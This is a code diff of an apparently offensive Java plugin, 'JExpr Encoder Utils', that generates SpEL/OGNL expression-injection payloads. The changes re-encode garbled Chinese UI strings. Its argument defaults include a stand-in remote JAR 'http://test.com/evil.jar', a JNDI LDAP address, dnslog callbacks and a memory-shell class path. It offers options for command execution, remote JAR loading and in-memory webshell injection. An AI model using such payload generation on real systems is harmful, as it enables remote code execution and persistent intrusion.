@@ -18,7 +18,7 @@ public class JExprEncoderPlugin implements IHelperPlugin {
         helperPluginCallbacks.setHelperPluginAutor("whwlsfb");
         helperPluginCallbacks.setHelperPluginName("JExpr Encoder Utils");
         helperPluginCallbacks.setHelperPluginVersion("0.2.2");
-        helperPluginCallbacks.setHelperPluginDescription("Java ±í´ïÊ½×¢ÈëÉú³ÉÆ÷");
+        helperPluginCallbacks.setHelperPluginDescription("Java è¡¨è¾¾å¼æ³¨å…¥ç”Ÿæˆå™¨");
         helperPluginCallbacks.registerHelper(new ArrayList<IHelper>() {{
             add(new JExprEncoder(new SpELExpr()));
             add(new JExprEncoder(new OGNLExpr()));
@@ -49,49 +49,49 @@ public class JExprEncoderPlugin implements IHelperPlugin {
             IArg args1 = pluginHelper.createArg();
             args1.setName("command");
             args1.setDefaultValue("whoami");
-            args1.setDescription("ÏëÒªÖ´ĞĞµÄÃüÁî");
+            args1.setDescription("æƒ³è¦æ‰§è¡Œçš„å‘½ä»¤");
             args1.setRequired(true);
             args.add(args1);
 
             IArg args2 = pluginHelper.createArg();
             args2.setName("dnslog_domain");
             args2.setDefaultValue("test.dnslog.com");
-            args2.setDescription("dnslogÓòÃû");
+            args2.setDescription("dnslogåŸŸå");
             args2.setRequired(true);
             args.add(args2);
 
             IArg args3 = pluginHelper.createArg();
             args3.setName("httplog_url");
             args3.setDefaultValue("http://test.dnslog.com");
-            args3.setDescription("httplogµØÖ·");
+            args3.setDescription("httplogåœ°å€");
             args3.setRequired(true);
             args.add(args3);
 
             IArg args4 = pluginHelper.createArg();
             args4.setName("sleep");
             args4.setDefaultValue("10");
-            args4.setDescription("sleepÊ±¼ä£¨Ãë£©");
+            args4.setDescription("sleepæ—¶é—´ï¼ˆç§’ï¼‰");
             args4.setRequired(true);
             args.add(args4);
 
             IArg args5 = pluginHelper.createArg();
             args5.setName("class_file");
             args5.setDefaultValue("/path/to/memshell.class");
-            args5.setDescription("ÄÚ´æÂíÎÄ¼şÂ·¾¶");
+            args5.setDescription("å†…å­˜é©¬æ–‡ä»¶è·¯å¾„");
             args5.setRequired(true);
             args.add(args5);
 
             IArg args7 = pluginHelper.createArg();
             args7.setName("jndi_address");
             args7.setDefaultValue("ldap://test.com");
-            args7.setDescription("JNDI·şÎñµØÖ·");
+            args7.setDescription("JNDIæœåŠ¡åœ°å€");
             args7.setRequired(true);
             args.add(args7);
 
             IArg args8 = pluginHelper.createArg();
             args8.setName("loadJar_params");
             args8.setDefaultValue("http://test.com/evil.jar|EvilClassName");
-            args8.setDescription("LoadJarÅäÖÃ");
+            args8.setDescription("LoadJaré…ç½®");
             args8.setRequired(true);
             args.add(args8);
 
@@ -106,7 +106,7 @@ public class JExprEncoderPlugin implements IHelperPlugin {
                 add("json");
                 add("unicode");
             }});
-            args6.setDescription("ÊÇ·ñ¶Ô½á¹û½øĞĞ±àÂë");
+            args6.setDescription("æ˜¯å¦å¯¹ç»“æœè¿›è¡Œç¼–ç ");
             args6.setRequired(true);
             args.add(args6);
 
@@ -121,33 +121,33 @@ public class JExprEncoderPlugin implements IHelperPlugin {
             if (settings.getString("command") != null) {
                 String[] exec = _expr.genExec(settings.getString("command"));
                 String[] execWithEcho = _expr.genExecWithEcho(settings.getString("command"));
-                output.successPrintln("ÃüÁîÖ´ĞĞ£º");
+                output.successPrintln("å‘½ä»¤æ‰§è¡Œï¼š");
                 printResult(exec, output);
-                output.successPrintln("ÃüÁîÖ´ĞĞ(»ØÏÔÊä³ö)£º");
+                output.successPrintln("å‘½ä»¤æ‰§è¡Œ(å›æ˜¾è¾“å‡º)ï¼š");
                 printResult(execWithEcho, output);
             }
 
             if (settings.getString("dnslog_domain") != null) {
                 String[] results = _expr.genDnslog(settings.getString("dnslog_domain"));
-                output.successPrintln("DnsLog£º");
+                output.successPrintln("DnsLogï¼š");
                 printResult(results, output);
             }
 
             if (settings.getString("httplog_url") != null) {
                 String[] results = _expr.genHttplog(settings.getString("httplog_url"));
-                output.successPrintln("HttpLog£º");
+                output.successPrintln("HttpLogï¼š");
                 printResult(results, output);
             }
 
             if (settings.getString("sleep") != null) {
                 String[] results = _expr.genSleep(settings.getInteger("sleep", 1));
-                output.successPrintln("Sleep£º");
+                output.successPrintln("Sleepï¼š");
                 printResult(results, output);
             }
 
             if (settings.getString("jndi_address") != null) {
                 String[] results = _expr.genJNDI(settings.getString("jndi_address"));
-                output.successPrintln("JNDI£º");
+                output.successPrintln("JNDIï¼š");
                 printResult(results, output);
             }
 
@@ -155,19 +155,19 @@ public class JExprEncoderPlugin implements IHelperPlugin {
                 String[] params = settings.getString("loadJar_params").split("\\|");
                 if (params.length == 2) {
                     String[] results = _expr.genLoadJar(params[0], params[1]);
-                    output.successPrintln("LoadJar£º");
+                    output.successPrintln("LoadJarï¼š");
                     printResult(results, output);
                 }else {
-                    output.warningPrintln("LoadJarÅäÖÃĞÅÏ¢Òì³£¡£");
+                    output.warningPrintln("LoadJaré…ç½®ä¿¡æ¯å¼‚å¸¸ã€‚");
                 }
             }
 
             if (settings.getFileContent("class_file") != null) {
                 String[] results = _expr.genMemShell(settings.getFileContent("class_file"));
-                output.successPrintln("ÄÚ´æÂí×¢Èë£º");
+                output.successPrintln("å†…å­˜é©¬æ³¨å…¥ï¼š");
                 printResult(results, output);
             } else {
-                output.warningPrintln("ÄÚ´æÂíÎÄ¼ş²»´æÔÚ£¬Ìø¹ıÉú³É¡£");
+                output.warningPrintln("å†…å­˜é©¬æ–‡ä»¶ä¸å­˜åœ¨ï¼Œè·³è¿‡ç”Ÿæˆã€‚");
             }
             output.rawPrintln("");
         }
@@ -181,7 +181,7 @@ public class JExprEncoderPlugin implements IHelperPlugin {
                     output.rawPrintln("");
                 }
             } else {
-                output.warningPrintln("Ôİ²»Ö§³Ö");
+                output.warningPrintln("æš‚ä¸æ”¯æŒ");
                 output.rawPrintln("");
             }
         }
